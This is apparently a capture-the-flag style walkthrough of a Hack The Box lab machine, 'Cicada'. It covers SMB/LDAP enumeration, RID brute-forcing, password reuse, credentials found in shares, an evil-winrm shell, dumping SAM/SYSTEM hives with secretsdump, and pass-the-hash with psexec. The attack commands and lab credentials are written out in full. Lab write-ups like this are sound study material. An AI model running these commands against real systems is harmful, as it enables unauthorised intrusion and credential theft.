# 1. Nmap: 
-> I always want to start here to see what ports are open and what services are running.

Lets start with a basic scan and see what we can find:
`sudo nmap -sV -sC 10.10.11.35 -oN nmap.basic`

When that scan is done I want to do a deeper scan and run that while I do other tasks.

`sudo nmap -p- -sV -sC --script=default,vuln,exploit -T4 -oN nmap.full 10.10.11.35`

Some output from the scan:
![[Pasted image 20250614145106.png]]

## What we can gather:
1. Domain name: cicada.htb
2. Kerberos is being used
3. SMB/LDAP in use (lets enumerate)

## What to try?
1. Null session on SMB?
	1. `rpcclient -U "" -N <target_ip> `
		1. ^^ nothing here either
2. Null session on LDAP?
	1. `ldapsearch -x -H ldap://10.10.11.35:389 -b "dc=cicada,dc=htb" "(objectClass=user)"`
	2. ^^ Got nothing here
3. User enumeration with kerbrute?

## Enum4linux:
`enum4linux -a 10.10.11.35`

==Usernames:== administrator, guest, krbtgt, domain admins, root, bin

`Domain Name: CICADA
Domain Sid: S-1-5-21-917908876-1423158569-3159038727`

## Kerbrute:
Try to find some valid usernames

`kerbrute userenum -d cicada.htb --dc 10.10.11.35 /usr/share/wordlists/statistically-likely-usernames/jsmith.txt -o valid_ad_users`

^^ Gave back nothing

## If we get a valid username and password we should use `ad-ldapdomaindump.py`

## smbclient:
`smbclient -L //10.10.11.35 -U "" 

Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      
        HR              Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
`

Above we see that there are non standard shares `DEV` and `HR`. How do we get to those?

==TRY:== `smbclient //10.10.11.35/HR -U ""`

-> When we list out files there is a file names "Notice from HR.txt". We can get that file. What is in it?

![[Pasted image 20250614151448.png]]

Looks like we have a password and a valid account!

`Cicada$M6Corpb*@Lp#nZp!8`

-> Let's use crackmapexec to validate these credentials.

	`sudo crackmapexec smb 10.10.11.35 -u cicada -p $M6Corpb*@Lp#nZp!8`

![[Pasted image 20250614151903.png]]
^^ These are valid creds! But how do we use them?


-> We should also go back and see if we can read anything from the `DEV` share <- No, we cannot list the `DEV` directory, but what else can we do? Can we try these creds with ==LDAP==?

`ldapsearch -x -H ldap://10.10.11.35 -D "CN=Cicada,...,DC=cicada,DC=htb" -w '$M6Corpb*@Lp#nZp!8' -b "dc=cicada,dc=htb" "(objectClass=*)"`

^^ Did not work -> Invalid credentials
`
![[Pasted image 20250614153335.png]]
^^ Windows server version

![[Pasted image 20250614153412.png]]

==What about== this ekjaovan user? Let's rerun the scan with that username. <- Returned the same stuff.

# To run impacket: (on my computer)
`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py`

## Brute RIDs with netexec for user enumeration:
`netexec smb cicada.htb -u zaa -p "" --rid-brute`

Found users:
![[Pasted image 20250614165119.png]]

Lets see if any of these work.

![[Pasted image 20250614165508.png]]

It seems `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8` works!
^^ Access denied with DEV share

#### No SPNs available:
`python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cicada.htb/michael.wrightson:'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip 10.10.11.35`
^^ Gets -> No entries found!

## User enumeration with netexec:
`netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`

![[Pasted image 20250614171424.png]]

It looks like a user left their password present!

`david.orelious:aRt$Lp#7t*VQ!3`
^^ This user has access to the DEV share!

```shell
python3 /usr/share/doc/python3-impacket/examples/smbclient.py cicada.htb/david.orelious:'aRt$Lp#7t*VQ!3'@10.10.11.35 -dc-ip 10.10.11.35
```

within DEV there is a file: 
![[Pasted image 20250614172325.png]]

Let's check this out and see what's in it.

![[Pasted image 20250614172424.png]]

More credentials!

emily.oscars:Q!3@Lp#M6b*7t*Vt

^^ No wmiexec :(

with these creds we can use smbclient again and list the ADMIN$ share (Got that info from enum4linux)

## evil-winrm:
`evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`

This gets us the user.txt flag on the desktop.

The user has backup privileges, so we can dump the sam and system database to get the administrator hash. 

```shell
<on_target> reg save hklm\sam C:\tempel\sam
<on_target> reg save hklm\system C:\tempel\system

<attacker_machine> python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam1 -system system LOCAL

```


![[Pasted image 20250614184724.png]]

We can pass the hash with psexec and read the root hash


# Summary:
1. We were able to list a share that had a password, but no username
2. Using netexec with RID bruteforce we found valid users
3. Trying the found password with the users exposed that the michael.wrightson had reused the default password
4. this user could list users, exposing a password from the david.orelious user.
5. david.orelious could read the DEV share, that had a backup file
6. this backup file included creds for an administrator account
7. the administrator account had backup privileges on the machine, using evil-winrm we could backup the SAM and SYSTEM files and download them to our machine
8. Secretsdump.py was used to extract the hashes giving the administrator hash
9. this hash could be used with psexec in a pass the hash attack, allowing us to read the root.txt file. 

That's alot for an easy machine...